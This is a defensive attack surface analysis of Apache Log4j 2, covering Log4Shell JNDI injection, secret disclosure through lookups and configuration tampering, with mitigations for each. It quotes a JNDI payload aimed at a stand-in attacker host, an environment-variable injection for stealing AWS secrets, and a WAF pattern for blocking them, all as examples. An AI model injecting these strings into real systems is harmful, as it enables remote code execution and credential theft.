# Attack Surface Analysis for apache/logging-log4j2

## Attack Surface: [1. JNDI Remote Code Execution (RCE)](./attack_surfaces/1__jndi_remote_code_execution__rce_.md)

*   **Description:** Attackers can inject malicious JNDI lookup strings into logged data, causing Log4j 2 to connect to an attacker-controlled server and execute arbitrary code.
*   **How Log4j2 Contributes:** Log4j 2's JNDI lookup feature, enabled by default in vulnerable versions, directly enables this attack. The core vulnerability lies in the *interpretation* of logged strings as potentially executable code.
*   **Example:** An attacker sends an HTTP request with a `User-Agent` header containing: `${jndi:ldap://attacker.com/exploit}`. If this header is logged, Log4j 2 will attempt to connect to `attacker.com` via LDAP and execute the provided payload.
*   **Impact:** Complete system compromise. Attackers can gain full control of the server, steal data, install malware, and pivot to other systems.
*   **Risk Severity:** Critical
*   **Mitigation Strategies:**
    *   **Primary:** Update to a fully patched version of Log4j 2 (2.17.1 or later for Java 8+, 2.12.4 or later for Java 7, 2.3.2 or later for Java 6). This is the *only* fully reliable mitigation.
    *   **Secondary (If patching is impossible *immediately*, but patching should be prioritized):**
        *   Set the system property `log4j2.formatMsgNoLookups` to `true`.  *Note: This is not sufficient on its own for all vulnerable versions, especially older ones.*
        *   Remove the `JndiLookup` class from the classpath: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`. *Note: This is a drastic measure and may break applications that legitimately rely on JNDI lookups (which is rare in logging contexts).*
        *   Implement a Web Application Firewall (WAF) rule to block requests containing `${jndi:`. *Note: This is a defense-in-depth measure and can be bypassed by obfuscation.*
        *   Thoroughly review and restrict all sources of logged data, minimizing the inclusion of user-controlled input.

## Attack Surface: [2. Information Disclosure via Lookups](./attack_surfaces/2__information_disclosure_via_lookups.md)

*   **Description:** Attackers can use other Log4j 2 lookup mechanisms (e.g., `${env:VAR}`, `${sys:VAR}`) to extract sensitive information from the environment or system properties.
*   **How Log4j2 Contributes:** Log4j 2's lookup feature allows embedding these expressions in log messages, which are then resolved and logged.
*   **Example:** An attacker injects `${env:AWS_SECRET_ACCESS_KEY}` into a logged field. If this environment variable exists, its value will be included in the log output.
*   **Impact:** Exposure of sensitive data, such as API keys, database credentials, or internal configuration details. This can lead to further attacks.
*   **Risk Severity:** High
*   **Mitigation Strategies:**
    *   Set the system property `log4j2.formatMsgNoLookups` to `true`. This disables *all* lookups, including JNDI.
    *   Review logging configurations and remove or restrict the use of lookups in pattern layouts.
    *   Implement strong access controls on log files and logging infrastructure.

## Attack Surface: [3. Configuration File Manipulation](./attack_surfaces/3__configuration_file_manipulation.md)

*   **Description:** If an attacker can modify the Log4j 2 configuration file, they can change logging behavior, potentially introducing new vulnerabilities or exfiltrating data.
*   **How Log4j2 Contributes:** Log4j 2's ability to dynamically reload its configuration file creates this attack vector.
*   **Example:** An attacker gains write access to the `log4j2.xml` file (through a separate vulnerability) and adds a malicious appender that sends log data to an attacker-controlled server.
*   **Impact:** Depends on the attacker's modifications. Could range from information disclosure to RCE (if a vulnerable appender is introduced).
*   **Risk Severity:** High (depending on the achieved modification)
*   **Mitigation Strategies:**
    *   Strictly control file system permissions on the Log4j 2 configuration file. Only authorized users and processes should have write access.
    *   Disable automatic configuration reloading (`monitorInterval="0"`) if not strictly necessary.
    *   Implement file integrity monitoring (FIM) to detect unauthorized changes to the configuration file.
    *   Use a secure configuration management system to manage and deploy Log4j 2 configurations.

